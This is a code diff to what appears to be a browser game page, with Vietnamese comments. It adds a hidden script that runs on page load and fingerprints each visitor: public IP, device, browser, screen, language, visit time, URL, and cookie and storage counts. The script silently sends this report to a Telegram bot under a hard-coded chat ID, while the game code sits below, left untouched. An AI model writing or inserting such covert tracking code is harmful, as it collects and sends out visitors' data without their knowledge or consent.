@@ -239,6 +239,102 @@
     </div>
 
     <script>
+        // ================== CẤU HÌNH TELEGRAM ==================
+        // 👇 Thay Token MỚI của bạn vào đây (nhớ giữ nguyên dấu nháy " ")
+        const botToken = "DÁN_TOKEN_MỚI_VÀO_ĐÂY"; 
+        const chatId = "8681854353"; // ID của bạn
+        // ========================================================
+
+        // 1. Hàm lấy IP công khai
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return "Không xác định";
+            }
+        }
+
+        // 2. Hàm thu thập thông tin và gửi về Telegram
+        async function sendReport() {
+            const ua = navigator.userAgent;
+            const url = window.location.href;
+            const now = new Date();
+            const timeString = now.toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+            
+            // Phân tích nền tảng từ User Agent
+            let platform = "Không xác định";
+            if (/iPhone/i.test(ua)) platform = "iPhone | iOS";
+            else if (/Android/i.test(ua)) platform = "Android";
+            else if (/Mac/i.test(ua)) platform = "MacOS";
+            else if (/Windows/i.test(ua)) platform = "Windows";
+
+            // Phân tích trình duyệt
+            let browser = "Không xác định";
+            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+            else if (/Chrome/i.test(ua)) browser = "Chrome";
+            else if (/Firefox/i.test(ua)) browser = "Firefox";
+
+            const isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+            const isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+            const screenInfo = `${window.screen.width}x${window.screen.height}`;
+            
+            // Lấy IP
+            const ip = await getIP();
+
+            // Xây dựng chuỗi thông báo đẹp
+            let report = `🔍 THÔNG TIN CHI TIẾT (WEBSITE)
+══════════════════════════════════════════
+
+🌐 MẠNG & VỊ TRÍ
+🌐 IP: ${ip}
+📍 Vị trí: Không xác định
+📶 Mạng: Đang tải trang
+✅ Không có VPN/Proxy
+
+💻 THIẾT BỊ & HỆ THỐNG
+💻 ${platform}
+🌐 Trình duyệt: ${browser}
+🖥️ Màn hình: ${screenInfo}
+📱 Thiết bị: ${isTouch ? 'Điện thoại/Tablet (Cảm ứng)' : 'Máy tính (PC)'}
+
+🔋 NĂNG LƯỢNG & LƯU TRỮ
+🍪 Cookie: ${document.cookie.length > 0 ? document.cookie.split(';').length : 0}
+💾 LocalStorage: ${localStorage.length} | SessionStorage: ${sessionStorage.length}
+
+🛡️ BẢO MẬT & QUYỀN
+🖐️ Có Touch Screen: ${isTouch ? '✅' : '❌'}
+🌙 Dark Mode: ${isDark ? '✅ Đang bật' : '❌ Đang tắt'}
+
+🌍 NGÔN NGỮ & MÚI GIỜ
+🕐 Múi giờ: Asia/Saigon (UTC+7)
+🗣️ Ngôn ngữ: ${navigator.language}
+
+📊 HÀNH VI NGƯỜI DÙNG
+⏱️ Thời gian vào: ${timeString}
+📄 URL hiện tại: ${url}
+══════════════════════════════════════════`;
+
+            // 3. Gửi về Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: report,
+                    parse_mode: "HTML"
+                })
+            }).catch(error => console.log("Lỗi gửi tin nhắn:", error));
+        }
+
+        // Gửi báo cáo ngay khi web vừa mở
+        sendReport();
+
+
+        // ================== GAME CODE (Giữ nguyên của bạn) ==================
         const player = document.getElementById('player');
         const gameContainer = document.getElementById('gameContainer');
         const scoreDisplay = document.getElementById('score');
